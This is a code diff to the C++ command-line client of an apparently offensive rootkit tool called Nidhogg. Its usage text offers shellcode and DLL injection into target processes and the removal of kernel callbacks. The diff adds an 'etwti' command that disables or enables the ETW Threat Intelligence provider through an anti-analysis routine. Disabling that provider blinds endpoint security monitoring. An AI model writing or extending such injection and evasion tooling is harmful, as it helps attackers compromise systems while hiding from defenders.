@@ -21,6 +21,7 @@ void PrintUsage() {
 	std::cout << "\tNidhoggClient.exe shinject [apc | thread] [pid] [shellcode file] [parameter 1] [parameter 2] [parameter 3]" << std::endl;
 	std::cout << "\tNidhoggClient.exe dllinject [apc | thread] [pid] [dll path]" << std::endl;
 	std::cout << "\tNidhoggClient.exe callbacks [query | remove | restore] [callback type] [callback address]" << std::endl;
+	std::cout << "\tNidhoggClient.exe etwti [enable | disable]" << std::endl;
 }
 
 int Error(int errorCode) {
@@ -92,9 +93,9 @@ int wmain(int argc, const wchar_t* argv[]) {
 	if (argc < 3)
 		return Error(NIDHOGG_INVALID_COMMAND);
 
-	if (_wcsicmp(argv[2], L"add") == 0)
+	if (_wcsicmp(argv[2], L"add") == 0 || _wcsicmp(argv[2], L"restore") == 0 || _wcsicmp(argv[2], L"enable") == 0)
 		option = Options::Add;
-	else if (_wcsicmp(argv[2], L"remove") == 0)
+	else if (_wcsicmp(argv[2], L"remove") == 0 || _wcsicmp(argv[2], L"disable") == 0)
 		option = Options::Remove;
 	else if (_wcsicmp(argv[2], L"clear") == 0)
 		option = Options::Clear;
@@ -148,6 +149,8 @@ int wmain(int argc, const wchar_t* argv[]) {
 					success = Nidhogg::RegistryUtils::NidhoggRegistryProtectKey(hNidhogg, _wcsdup(argv[3]));
 				}
 			}
+			else if (_wcsicmp(argv[1], L"etwti") == 0)
+				success = Nidhogg::AntiAnalysis::NidhoggEnableDisableEtwTi(hNidhogg, true);
 			else if (_wcsicmp(argv[1], L"callbacks") == 0) {
 				CallbackType callbackType;
 				ULONG64 address = 0;
@@ -199,6 +202,8 @@ int wmain(int argc, const wchar_t* argv[]) {
 					success = Nidhogg::RegistryUtils::NidhoggRegistryUnprotectKey(hNidhogg, _wcsdup(argv[3]));
 				}
 			}
+			else if (_wcsicmp(argv[1], L"etwti") == 0)
+				success = Nidhogg::AntiAnalysis::NidhoggEnableDisableEtwTi(hNidhogg, false);
 			else if (_wcsicmp(argv[1], L"callbacks") == 0) {
 				CallbackType callbackType;
 				ULONG64 address = 0;
